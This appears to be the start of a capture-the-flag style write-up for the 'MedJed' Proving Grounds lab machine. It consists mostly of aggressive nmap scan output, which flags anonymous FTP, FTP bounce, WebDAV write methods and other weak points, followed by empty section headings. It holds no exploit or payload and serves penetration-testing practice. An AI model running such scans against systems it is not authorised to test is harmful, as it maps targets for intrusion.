# MedJed

8000/tcp open  http-alt   BarracudaServer.com (Windows)
30021/tcp open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta
33033/tcp open  unknown       syn-ack ttl 127 - HTTP
44330/tcp open  ssl/unknown   syn-ack ttl 127
45332/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
45443/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Tue Jan 25 00:29:06 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/results/192.168.65.127/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/results/192.168.65.127/scans/xml/_full_tcp_nmap.xml" 192.168.65.127
Increasing send delay for 192.168.65.127 from 0 to 5 due to 2577 out of 6442 dropped probes since last increase.
adjust_timeouts2: packet supposedly had rtt of -167439 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -167439 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -99858 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -99858 microseconds.  Ignoring time.
Nmap scan report for 192.168.65.127
Host is up, received user-set (0.18s latency).
Scanned at 2022-01-25 00:29:09 EST for 1190s
Not shown: 65516 closed ports
Reason: 65516 resets
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
3306/tcp  open  mysql?        syn-ack ttl 127
| fingerprint-strings: 
|   NULL, ZendJavaBridge, ibm-db2, oracle-tns: 
|_    Host '192.168.49.65' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.65' is not allowed to connect to this MariaDB server
5040/tcp  open  unknown       syn-ack ttl 127
7680/tcp  open  tcpwrapped    syn-ack ttl 127
8000/tcp  open  http-alt      syn-ack ttl 127 BarracudaServer.com (Windows)
| fingerprint-strings: 
|   FourOhFourRequest, Socks5: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:39:24 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines, GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:39:17 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HELP4STOMP: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:42:23 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:39:30 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   OfficeScan: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:42:17 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Length: 0
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 25 Jan 2022 05:40:48 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   apple-iphoto: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 25 Jan 2022 05:43:46 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>HTTP/1.1 clients must supply "host" header<p>BarracudaServer.com (Windows)</p></body></html>
|_http-favicon: Unknown favicon MD5: FDF624762222B41E2767954032B6F1FF
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK POST
|_  Potentially risky methods: PROPFIND PUT COPY DELETE MOVE MKCOL PROPPATCH LOCK UNLOCK
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: BarracudaServer.com (Windows)
|_http-title: Home
| http-webdav-scan: 
|   Server Type: BarracudaServer.com (Windows)
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_  Server Date: Tue, 25 Jan 2022 05:48:26 GMT
30021/tcp open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.41 beta
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            536 Nov 03  2020 .gitignore
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 app
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 bin
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 config
| -r--r--r-- 1 ftp ftp            130 Nov 03  2020 config.ru
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 db
| -r--r--r-- 1 ftp ftp           1750 Nov 03  2020 Gemfile
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 lib
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 log
| -r--r--r-- 1 ftp ftp             66 Nov 03  2020 package.json
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 public
| -r--r--r-- 1 ftp ftp            227 Nov 03  2020 Rakefile
| -r--r--r-- 1 ftp ftp            374 Nov 03  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 test
| drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 tmp
|_drwxr-xr-x 1 ftp ftp              0 Nov 03  2020 vendor
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
33033/tcp open  unknown       syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 3102
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <title>Action Controller: Exception caught</title>
|     <style>
|     body {
|     background-color: #FAFAFA;
|     color: #333;
|     margin: 0px;
|     body, p, ol, ul, td {
|     font-family: helvetica, verdana, arial, sans-serif;
|     font-size: 13px;
|     line-height: 18px;
|     font-size: 11px;
|     white-space: pre-wrap;
|     pre.box {
|     border: 1px solid #EEE;
|     padding: 10px;
|     margin: 0px;
|     width: 958px;
|     header {
|     color: #F0F0F0;
|     background: #C52F24;
|     padding: 0.5em 1.5em;
|     margin: 0.2em 0;
|     line-height: 1.1em;
|     font-size: 2em;
|     color: #C52F24;
|     line-height: 25px;
|     .details {
|_    bord
44330/tcp open  ssl/unknown   syn-ack ttl 127
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:40:46 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GenericLines: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:39:34 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:39:35 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HELP4STOMP: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:42:48 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:39:36 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   OfficeScan: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:42:42 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   SIPOptions: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 25 Jan 2022 05:41:03 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|     <html><body><h1>400 Bad Request</h1>Can't parse request<p>BarracudaServer.com (Windows)</p></body></html>
|   Socks5: 
|     HTTP/1.1 200 OK
|     Date: Tue, 25 Jan 2022 05:42:36 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|   apple-iphoto: 
|     HTTP/1.1 400 Bad Request
|     Date: Tue, 25 Jan 2022 05:44:14 GMT
|     Server: BarracudaServer.com (Windows)
|     Connection: Close
|     Content-Type: text/html
|     Cache-Control: no-store, no-cache, must-revalidate, max-age=0
|_    <html><body><h1>400 Bad Request</h1>HTTP/1.1 clients must supply "host" header<p>BarracudaServer.com (Windows)</p></body></html>
| ssl-cert: Subject: commonName=server demo 1024 bits/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US/localityName=Laguna Niguel/emailAddress=ginfo@realtimelogic.com/organizationalUnitName=SharkSSL
| Issuer: commonName=demo CA/organizationName=Real Time Logic/stateOrProvinceName=CA/countryName=US/localityName=Laguna Niguel/emailAddress=ginfo@realtimelogic.com/organizationalUnitName=SharkSSL
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-08-27T14:40:47
| Not valid after:  2019-08-25T14:40:47
| MD5:   3dd3 7bf7 464d a77b 6d04 f44c 154b 7563
| SHA-1: 3dc2 5fc6 a16f 1c51 8eee 45ce 80cf b35e 7f92 ebbe
| -----BEGIN CERTIFICATE-----
| MIICsTCCAhoCAQUwDQYJKoZIhvcNAQEEBQAwgZkxCzAJBgNVBAYTAlVTMQswCQYD
| VQQIEwJDQTEWMBQGA1UEBxMNTGFndW5hIE5pZ3VlbDEYMBYGA1UEChMPUmVhbCBU
| aW1lIExvZ2ljMREwDwYDVQQLEwhTaGFya1NTTDEQMA4GA1UEAxMHZGVtbyBDQTEm
| MCQGCSqGSIb3DQEJARYXZ2luZm9AcmVhbHRpbWVsb2dpYy5jb20wHhcNMDkwODI3
| MTQ0MDQ3WhcNMTkwODI1MTQ0MDQ3WjCBpzELMAkGA1UEBhMCVVMxCzAJBgNVBAgT
| AkNBMRYwFAYDVQQHEw1MYWd1bmEgTmlndWVsMRgwFgYDVQQKEw9SZWFsIFRpbWUg
| TG9naWMxETAPBgNVBAsTCFNoYXJrU1NMMR4wHAYDVQQDExVzZXJ2ZXIgZGVtbyAx
| MDI0IGJpdHMxJjAkBgkqhkiG9w0BCQEWF2dpbmZvQHJlYWx0aW1lbG9naWMuY29t
| MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDI9kHT2xeC8GaBWFcTTqBLU2iF
| Jt8gu5khgjW1LMkOQ1GgX53+siZP4QxPaua0pIEaGXh/qe1wYmucEjxJvidsyFyN
| vgUjS7yP8AMCRGqdxhkbM4A5mcnmxu/8cRxFf19CIVnsD+netpHrscJfmk5f70cz
| QLQQ2NlT8exLSh+5cQIDAQABMA0GCSqGSIb3DQEBBAUAA4GBAJFWpZDFuw9DUEQW
| Uixb8tg17VjTMEQMd136md/KhwlDrhR2Dqk3cs1XRcuZxEHLN7etTBm/ubkMi6bx
| Jq9rgmn/obL94UNkhuV/0VyHQiNkBrjdf4eY6zNY71PgVBxC0wULL5pcpfo0xUKc
| IDMYIaRX7wyNO/lZcxIj0xmxTrqu
|_-----END CERTIFICATE-----
|_ssl-date: 2022-01-25T05:48:57+00:00; 0s from scanner time.
45332/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
45443/tcp open  http          syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Quiz App
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3306-TCP:V=7.91%I=9%D=1/25%Time=61EF8CFF%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.65'\x20is\x20not\x20all
SF:owed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(oracle-tns
SF:,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.65'\x20is\x20not\x20allow
SF:ed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ibm-db2,4C,"
SF:H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.65'\x20is\x20not\x20allowed\x2
SF:0to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(ZendJavaBridge,4C
SF:,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.65'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8000-TCP:V=7.91%I=9%D=1/25%Time=61EF8D05%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x20
SF:2022\x2005:39:17\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows
SF:\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\x20200\
SF:x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:39:17\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r
SF:\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2
SF:025\x20Jan\x202022\x2005:39:24\x20GMT\r\nServer:\x20BarracudaServer\.co
SF:m\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(Socks5,72,"HTTP/1\
SF:.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:39:24\x20GM
SF:T\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20C
SF:lose\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue
SF:,\x2025\x20Jan\x202022\x2005:39:30\x20GMT\r\nServer:\x20BarracudaServer
SF:\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72
SF:,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:39
SF::30\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(SIPOptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:40:48\x20GMT\r\nServe
SF:r:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\nCo
SF:ntent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x20no-cache,\x2
SF:0must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400\x20Bad\x20Req
SF:uest</h1>Can't\x20parse\x20request<p>BarracudaServer\.com\x20\(Windows\
SF:)</p></body></html>")%r(OfficeScan,85,"HTTP/1\.1\x20200\x20OK\r\nDate:\
SF:x20Tue,\x2025\x20Jan\x202022\x2005:42:17\x20GMT\r\nServer:\x20Barracuda
SF:Server\.com\x20\(Windows\)\r\nConnection:\x20Close\r\nContent-Length:\x
SF:200\r\n\r\n")%r(HELP4STOMP,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\
SF:x2025\x20Jan\x202022\x2005:42:23\x20GMT\r\nServer:\x20BarracudaServer\.
SF:com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(apple-iphoto,153
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2025\x20Jan\x202
SF:022\x2005:43:46\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\
SF:)\r\nConnection:\x20Close\r\nContent-Type:\x20text/html\r\nCache-Contro
SF:l:\x20no-store,\x20no-cache,\x20must-revalidate,\x20max-age=0\r\n\r\n<h
SF:tml><body><h1>400\x20Bad\x20Request</h1>HTTP/1\.1\x20clients\x20must\x2
SF:0supply\x20\"host\"\x20header<p>BarracudaServer\.com\x20\(Windows\)</p>
SF:</body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port33033-TCP:V=7.91%I=9%D=1/25%Time=61EF8D05%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(GetReque
SF:st,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x2
SF:0charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!DOCTYPE\x20html>\n<h
SF:tml\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n
SF:\x20\x20<title>Action\x20Controller:\x20Exception\x20caught</title>\n\x
SF:20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20backg
SF:round-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20color:\x20#333;\n\x20
SF:\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x20\x20\x20\x20font-f
SF:amily:\x20helvetica,\x20verdana,\x20arial,\x20sans-serif;\n\x20\x20\x20
SF:\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x20\x20\x20\x20line-h
SF:eight:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\x20{\n\x20\x2
SF:0\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\x20\x20\x20white-spa
SF:ce:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20pre\.box\x20{\n\
SF:x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#EEE;\n\x20\x20\x20\x
SF:20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\
SF:x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x20\x20}\n\n\x20\x20\
SF:x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#F0F0F0;\n\x20\x2
SF:0\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20paddi
SF:ng:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h1\x20{\
SF:n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\x20\x20\x20\x20\x20\
SF:x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x20font-size:\x202em;\
SF:n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20\x20\x20\x20\x20\x20
SF:color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-height:\x2025px;\n\x20
SF:\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x20\x20\x20\x20\x20\x
SF:20bord")%r(HTTPOptions,C76,"HTTP/1\.0\x20403\x20Forbidden\r\nContent-Ty
SF:pe:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x203102\r\n\r\n<!
SF:DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20chars
SF:et=\"utf-8\"\x20/>\n\x20\x20<title>Action\x20Controller:\x20Exception\x
SF:20caught</title>\n\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\
SF:x20\x20\x20\x20background-color:\x20#FAFAFA;\n\x20\x20\x20\x20\x20\x20c
SF:olor:\x20#333;\n\x20\x20\x20\x20\x20\x20margin:\x200px;\n\x20\x20\x20\x
SF:20}\n\n\x20\x20\x20\x20body,\x20p,\x20ol,\x20ul,\x20td\x20{\n\x20\x20\x
SF:20\x20\x20\x20font-family:\x20helvetica,\x20verdana,\x20arial,\x20sans-
SF:serif;\n\x20\x20\x20\x20\x20\x20font-size:\x20\x20\x2013px;\n\x20\x20\x
SF:20\x20\x20\x20line-height:\x2018px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\
SF:x20pre\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x2011px;\n\x20\x20\x20\
SF:x20\x20\x20white-space:\x20pre-wrap;\n\x20\x20\x20\x20}\n\n\x20\x20\x20
SF:\x20pre\.box\x20{\n\x20\x20\x20\x20\x20\x20border:\x201px\x20solid\x20#
SF:EEE;\n\x20\x20\x20\x20\x20\x20padding:\x2010px;\n\x20\x20\x20\x20\x20\x
SF:20margin:\x200px;\n\x20\x20\x20\x20\x20\x20width:\x20958px;\n\x20\x20\x
SF:20\x20}\n\n\x20\x20\x20\x20header\x20{\n\x20\x20\x20\x20\x20\x20color:\
SF:x20#F0F0F0;\n\x20\x20\x20\x20\x20\x20background:\x20#C52F24;\n\x20\x20\
SF:x20\x20\x20\x20padding:\x200\.5em\x201\.5em;\n\x20\x20\x20\x20}\n\n\x20
SF:\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20margin:\x200\.2em\x200;\n\
SF:x20\x20\x20\x20\x20\x20line-height:\x201\.1em;\n\x20\x20\x20\x20\x20\x2
SF:0font-size:\x202em;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20h2\x20{\n\x20
SF:\x20\x20\x20\x20\x20color:\x20#C52F24;\n\x20\x20\x20\x20\x20\x20line-he
SF:ight:\x2025px;\n\x20\x20\x20\x20}\n\n\x20\x20\x20\x20\.details\x20{\n\x
SF:20\x20\x20\x20\x20\x20bord");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port44330-TCP:V=7.91%T=SSL%I=9%D=1/25%Time=61EF8D16%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20
SF:Jan\x202022\x2005:39:34\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(
SF:Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(GetRequest,72,"HTTP/1\.1\
SF:x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:39:35\x20GMT\r
SF:\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Clos
SF:e\r\n\r\n")%r(HTTPOptions,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x
SF:2025\x20Jan\x202022\x2005:39:36\x20GMT\r\nServer:\x20BarracudaServer\.c
SF:om\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(RTSPRequest,72,"H
SF:TTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:39:36
SF:\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection
SF::\x20Close\r\n\r\n")%r(FourOhFourRequest,72,"HTTP/1\.1\x20200\x20OK\r\n
SF:Date:\x20Tue,\x2025\x20Jan\x202022\x2005:40:46\x20GMT\r\nServer:\x20Bar
SF:racudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(SI
SF:POptions,13C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Tue,\x2025
SF:\x20Jan\x202022\x2005:41:03\x20GMT\r\nServer:\x20BarracudaServer\.com\x
SF:20\(Windows\)\r\nConnection:\x20Close\r\nContent-Type:\x20text/html\r\n
SF:Cache-Control:\x20no-store,\x20no-cache,\x20must-revalidate,\x20max-age
SF:=0\r\n\r\n<html><body><h1>400\x20Bad\x20Request</h1>Can't\x20parse\x20r
SF:equest<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>")%r(Sock
SF:s5,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x20
SF:05:42:36\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nCo
SF:nnection:\x20Close\r\n\r\n")%r(OfficeScan,72,"HTTP/1\.1\x20200\x20OK\r\
SF:nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:42:42\x20GMT\r\nServer:\x20Ba
SF:rracudaServer\.com\x20\(Windows\)\r\nConnection:\x20Close\r\n\r\n")%r(H
SF:ELP4STOMP,72,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Tue,\x2025\x20Jan\x202
SF:022\x2005:42:48\x20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\
SF:)\r\nConnection:\x20Close\r\n\r\n")%r(apple-iphoto,153,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nDate:\x20Tue,\x2025\x20Jan\x202022\x2005:44:14\x
SF:20GMT\r\nServer:\x20BarracudaServer\.com\x20\(Windows\)\r\nConnection:\
SF:x20Close\r\nContent-Type:\x20text/html\r\nCache-Control:\x20no-store,\x
SF:20no-cache,\x20must-revalidate,\x20max-age=0\r\n\r\n<html><body><h1>400
SF:\x20Bad\x20Request</h1>HTTP/1\.1\x20clients\x20must\x20supply\x20\"host
SF:\"\x20header<p>BarracudaServer\.com\x20\(Windows\)</p></body></html>");
Aggressive OS guesses: Microsoft Windows 7 (90%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows XP SP3 (88%), Microsoft Windows 98 SE (87%), Microsoft Windows Server 2008 SP1 (87%), Microsoft Windows 10 (87%), Microsoft Windows 7 or Windows Server 2008 R2 (86%), Microsoft Windows Server 2008 (86%), Microsoft Windows Server 2008 R2 (86%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (86%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/25%OT=135%CT=1%CU=38684%PV=Y%DS=2%DC=T%G=Y%TM=61EF8F
OS:4B%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TS=U)SEQ(SP=108%GCD=1%
OS:ISR=109%TI=RD%TS=U)OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8
OS:NNS%O5=M54ENW8NNS%O6=M54ENNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF
OS:%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 61178/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38299/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 28740/udp): CLEAN (Failed to receive data)
|   Check 4 (port 27739/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-25T05:48:31
|_  start_date: N/A

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   174.87 ms 192.168.49.1
2   175.05 ms 192.168.65.127

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 25 00:48:59 2022 -- 1 IP address (1 host up) scanned in 1193.41 seconds

```

## 135 - RPC

## 139, 445 - SMB

## 3306 - MySQL
```
3306/tcp open  mysql?        syn-ack ttl 127
| fingerprint-strings: 
|   NessusTPv12, SMBProgNeg, Socks5, ibm-mqseries: 
